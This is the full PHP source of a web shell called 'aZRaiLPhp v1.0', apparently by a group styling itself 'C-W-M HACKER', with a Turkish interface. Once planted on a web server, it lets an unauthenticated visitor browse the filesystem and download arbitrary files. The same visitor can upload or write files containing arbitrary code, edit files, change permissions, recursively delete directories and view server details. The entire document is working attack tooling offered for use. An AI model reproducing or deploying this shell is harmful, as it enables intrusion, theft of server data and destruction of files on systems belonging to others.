<?php
$default=$DOCUMENT_ROOT;
$this_file="./azrailphp.php";

if(isset($save)){
$fname=str_replace(" ","_",$fname);
$fname=str_replace("%20","_",$fname);
header("Cache-control: private");
header("Content-type: application/force-download");
header("Content-Length: ".filesize($save));
header("Content-Disposition: attachment; filename=$fname");

$fp = fopen($save, 'r');
fpassthru($fp);
fclose($fp);
unset($save);
exit;
}

if ( function_exists('ini_get') ) {
        $onoff = ini_get('register_globals');
} else {
        $onoff = get_cfg_var('register_globals');
}
if ($onoff != 1) {
        @extract($_POST, EXTR_SKIP);
        @extract($_GET, EXTR_SKIP);
}


function deltree($deldir) {
        $mydir=@dir($deldir);
        while($file=$mydir->read())        {
                if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) {
                        @chmod("$deldir/$file",0777);
                        deltree("$deldir/$file");
                }
                if (is_file("$deldir/$file")) {
                        @chmod("$deldir/$file",0777);
                        @unlink("$deldir/$file");
                }
        }
        $mydir->close();
        @chmod("$deldir",0777);
        echo @rmdir($deldir) ? "<center><b><font color='#0000FF'>SÝLÝNDÝ:$deldir/$file</b></font></center>" : "<center><font color=\"#ff0000\">Silinemedi:$deldir/$file</font></center>";
        }

if ($op=='phpinfo'){
$fonk_kap = get_cfg_var("fonksiyonlarý_kapat");
        echo $phpinfo=(!eregi("phpinfo",$fonk_kapat)) ? phpinfo() : "<center>phpinfo() Komutu Çalýþmýyiii</center>";
        exit;
}


echo "<html>
      <head>
             <title>azrail 1.0 by C-W-M</title>
      </head>

       <body bgcolor='#000000' text='#008000' link='#00FF00' vlink='#00FF00' alink='#00FF00'>
       </body>";

echo "<center><font size='+3' color='#FF0000'><b> aZRaiLPhp v1.0!!!</b></font></center><br>
      <center><font size='+2' color='#FFFFFF'>C-W-M</font><font size='+2' color='#FF0000'>HACKER</font><br>
      <br>";
echo "<center><a href='./$this_file?op=phpinfo' target='_blank'>PHP INFO</a></center>";
echo "<br>
      <br>";

echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------";
echo "<div align=center>
      <font size='+1' color='#0000FF'>Root Klasör: $DOCUMENT_ROOT</font><br>
      <font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$REDIRECT_URL</font> <form method=post action=$this_file>";

if(!isset($dir)){
$dir="$default";
}
echo "<input type=text size=60 name=dir value='$dir'>
<input type=submit value='GIT'><br>
</form>
</div>";

if ($op=='up'){
        $path=dir;
        echo "<br><br><center><font size='+1' color='#FF0000'><b>DOSYA GONDERME</b></font></center><br>";
if(isset($dosya_gonder)) {

if (copy ( $dosya_gonder, "$dir/$dosya_gonder_name" )){
    echo "<center><font color='#0000FF'>Dosya Baþarýyla Gönderildi</font></center>";
}
} elseif(empty($dosya_gonder)) {
$path=$dir;
$dir = $dosya_dizin;
echo "$dir";
echo "<FORM  ENCTYPE='multipart/form-data' ACTION='$this_file?op=up&dir=$path' METHOD='POST'>";
echo "<center><INPUT TYPE='file' NAME='dosya_gonder'></center><br>";

echo "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>";
echo "</form>";


echo "</html>";
} else {
die ("<center><font color='#FF0000'>Dosya kopyalanamýyor!</font><center>");
}
}

if($op=='mf'){
    $path=$dir;
    if(isset($dismi) && isset($kodlar)){
                $ydosya="$path/$dismi";
                if(file_exists("$path/$dismi")){
                        $dos= "Böyle Bir Dosya Vardý Üzerine Yazýldý";
                } else {
                        $dos = "Dosya Oluþturuldu";
                }
                touch ("$path/$dismi") or die("Dosya Oluþturulamýyor");
                $ydosya2 = fopen("$ydosya", 'w') or die("Dosya yazmak için açýlamýyor");
                fwrite($ydosya2, $kodlar) or die("Dosyaya yazýlamýyor");
                fclose($ydosya2);
                echo "<center><font color='#0000FF'>$dos</font></center>";
        } else {

        echo "<FORM METHOD='POST' ACTION='$this_file?op=mf&dir=$path'>";
        echo "<center>Dosya Ýsmi :<input type='text' name='dismi'></center><br>";
    echo "<br>";
    echo "<center>KODLAR</center><br>";
    echo "<center><TEXTAREA NAME='kodlar' ROWS='19' COLS='52'></TEXTAREA></center>";
        echo "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>";
    echo "</form>";
        }
}

if($op=='md'){
        $path=$dir;
        if(isset($kismi) && isset($okmf)){
                $klasör="$path/$kismi";
                mkdir("$klasör", 0777) or die ("<center><font color='#0000FF'>Klasör Oluþturulamýyor</font></center>");
                echo "<center><font color='#0000FF'>Klasör Oluþturuldu</font></center>";
        }

        echo "<FORM METHOD='POST' ACTION='$this_file?op=md&dir=$path'>";
        echo "<center>Klasör Ýsmi :<input type='text' name='kismi'></center><br>";
        echo "<br>";
        echo "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>";
        echo "</form>";
}


if($op=='del'){
unlink("$fname");
}


if($op=='dd'){
        $dir=$here;
                $deldirs=$yol;
                if(!file_exists("$deldirs")) {
                        echo "<font color=\"#ff0000\">Dosya Yok</font>";
                } else {
                        deltree($deldirs);
                }
}



if($op=='edit'){
$yol=$fname;
$yold=$path;
if (isset($ok)){
$dosya = fopen("$yol", 'w') or die("Dosya Açýlamýyor");
$metin=$tarea;
fwrite($dosya, $metin) or die("Yazýlamýyor!");
fclose($dosya);
echo "<center><font color='#0000FF'Dosya Baþarýyla Düzenlendi</font></center>";
} else {
$path=$dir;
echo "<center>DÜZENLE: $yol</center>";
$dosya = fopen("$yol", 'r') or die("<center><font color='#FF0000'Dosya Açýlamýyor</font></center>");
$boyut=filesize($yol);
$duzen = @fread ($dosya, $boyut);
echo "<form method=post action=$this_file?op=edit&fname=$yol&dir=$path>";
echo "<center><TEXTAREA style='WIDTH: 476px; HEIGHT: 383px' name=tarea rows=19 cols=52>$duzen</TEXTAREA></center><br>";
echo "<center><input type='Submit' value='TAMAM' name='ok'></center>";
fclose($dosya);
$duzen=htmlspecialchars($duzen);
echo "</form>";
}
}

if($op=='efp2'){
$fileperm=base_convert($_POST['fileperm'],8,10);
        echo $msg=@chmod($dir."/".$dismi2,$fileperm) ? "<font color='#0000FF'><b>$dismi2 ÝSÝMLÝ DOSYANIN</font></b>" : "<font color=\"#ff0000\">DEÝÞTÝRÝLEMEDÝ!!</font>";
        echo " <font color='#0000FF'>CHMODU ".substr(base_convert(@fileperms($dir."/".$dismi2),10,8),-4)." OLARAK DEÝÞTÝRÝLDÝ</font>";
}

if($op=='efp'){
$izinler2=substr(base_convert(@fileperms($fname),10,8),-4);
echo "<form method=post action=./$this_file?op=efp2>
      <div align=center><input name='dismi2' type='text' value='$dismi' class='input' readonly>CHMOD:
      <input type='text' name='fileperm' size='20' value='$izinler2' class='input'>
      <input name='dir' type='hidden' value='$yol'>
      <input type='submit' value='TAMAM' class='input'></div><br>
      </form>";

}


$path=$dir;
if(isset($dir)){
if ($dir = @opendir("$dir")) {
while (($file = readdir($dir)) !== false) {
if($file!="." && $file!=".."){
if(is_file("$path/$file")){
$disk_space=filesize("$path/$file");
$kb=$disk_space/1024;
$total_kb = number_format($kb, 2, '.', '');
$total_kb2="Kb";


echo "<div align=right><font face='arial' size='2' color='#C0C0C0'><b> $file</b></font> - <a href='./$this_file?save=$path/$file&fname=$file'>indir</a> - <a href='./$this_file?op=edit&fname=$path/$file&dir=$path'>düzenle</a> - ";
echo "<a href='./$this_file?op=del&fname=$path/$file&dir=$path'>sil</a> - <b>$total_kb$total_kb2</b> - ";
@$fileperm=substr(base_convert(fileperms("$path/$file"),10,8),-4);
echo "<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><font color='#FFFF00'>$fileperm</font></a>";
echo "<br></div>\n";
}else{
echo "<div align=left><a href='./$this_file?dir=$path/$file'>GÝT></a> <font face='arial' size='3' color='#808080'> $path/$file</font> - <b>DIR</b> - <a href='./$this_file?op=dd&yol=$path/$file&here=$path'>Sil</a> - ";
$dirperm=substr(base_convert(fileperms("$path/$file"),10,8),-4);
echo "<font color='#FFFF00'>$dirperm</font>";
echo " <br></div>\n";

}
}
}
closedir($dir);
}
}





echo "<center><a href='./$this_file?dir=$DOCUMENT_ROOT'>Root Klasörüne Git</a></center>";
if(file_exists("B:\\")){
echo "<center><a href='./$this_file?dir=B:\\'>B:\\</a></center>";
} else {}
if(file_exists("C:\\")){
echo "<center><a href='./$this_file?dir=C:\\'>C:\\</a></center>";
} else {}
if (file_exists("D:\\")){
 echo "<center><a href='./$this_file?dir=D:\\'>D:\\</a></center>";
} else {}
if (file_exists("E:\\")){
 echo "<center><a href='./$this_file?dir=E:\\'>E:\\</a></center>";
} else {}
if (file_exists("F:\\")){
 echo "<center><a href='./$this_file?dir=F:\\'>F:\\</a></center>";
} else {}
if (file_exists("G:\\")){
 echo "<center><a href='./$this_file?dir=G:\\'>G:\\</a></center>";
} else {}
if (file_exists("H:\\")){
 echo "<center><a href='./$this_file?dir=H:\\'>H:\\</a></center>";
} else {}


echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------";
echo "<center><font size='+1' color='#FF0000'><b>SERVER BÝLGÝLERÝ</b></font><br></center>";
echo "<br><u><b>$SERVER_SIGNATURE</b></u>";
echo "<b><u>Software</u>: $SERVER_SOFTWARE</b><br>";
echo "<b><u>Server IP</u>: $SERVER_ADDR</b><br>";
echo "<br>";
echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------";
echo "<center><font size='+1' color='#FF0000'><b>ÝÞLEMLER</b></font><br></center>";
echo "<br><center><font size='4'><a href='$this_file?op=up&dir=$path'>Dosya Gönder</a></font></center>";
echo "<br><center><font size='4'><a href='$this_file?op=mf&dir=$path'>Dosya Oluþtur</a></font></center>";
echo "<br><center><font size='4'><a href='$this_file?op=md&dir=$path'>Klasör Oluþtur</a></font></center>";
echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------";
echo "<center>Tüm haklarý sahibi 	C-W-M'ye aittir</center><br>";
?>




